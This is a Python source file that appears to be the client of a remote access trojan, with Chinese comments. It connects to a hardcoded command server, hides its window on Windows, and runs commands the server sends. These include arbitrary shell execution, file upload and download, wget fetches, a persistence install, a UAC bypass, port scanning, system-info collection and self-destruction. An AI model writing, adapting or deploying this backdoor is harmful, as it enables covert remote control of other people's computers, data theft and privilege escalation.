# -*- coding: UTF-8 -*-
import socket
import subprocess
import sys

from src import common
from src import crypto
from src import util
from src import reg


# 服务端地址和端口
HOST = '192.168.1.186'
PORT = 1335

def main():

    # 客户端系统
    plat = sys.platform
    if plat.startswith('win'):
        plat = 'win'
        # 隐藏窗口
        util.hide_windows(1)
    elif plat.startswith('linux'):
        plat = 'nix'
    elif plat.startswith('darwin'):
        plat = 'mac'
    # 不知道是啥系统
    else:
        plat = 'what'

    conn = socket.socket()
    conn.connect((HOST, PORT))
    client = common.Client(conn, HOST, 1)

    while True:
        results = ''

        # 接收从服务端传来的命令
        data = client.recvGCM()

        # 空命令
        if not data:
            continue

        cmd, _, action = data.partition(' ')

        # 服务端下载
        if cmd == 'download':
            client.sendfile(action.rstrip())
            continue
        
        # 服务端上传
        elif cmd == 'upload':
            client.recvfile(action.rstrip())
            continue

        # 执行 cmd 命令
        elif cmd == 'cmd':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()

        # 关闭连接
        elif cmd == 'kill':
            conn.close()
            sys.exit(0)

        # 持久运行
        elif cmd == 'persistence':
            results = reg.persistence(plat)

        # 绕过 UAC
        elif cmd == 'bypass':
            results = reg.bypass_uac(plat)

        # 端口可用情况
        elif cmd == 'scan':
            results = util.scan()

        # 自毁
        elif cmd == 'sacrifice':
            conn.close()
            reg.sacrifice(plat)

        # 基本信息
        elif cmd == 'info':
            results = util.info(plat)

        # 解压
        elif cmd == 'unzip':
            results = util.unzip(action)

        elif cmd == 'wget':
            results = util.wget(action)

        client.sendGCM(results)


if __name__ == '__main__':
    main()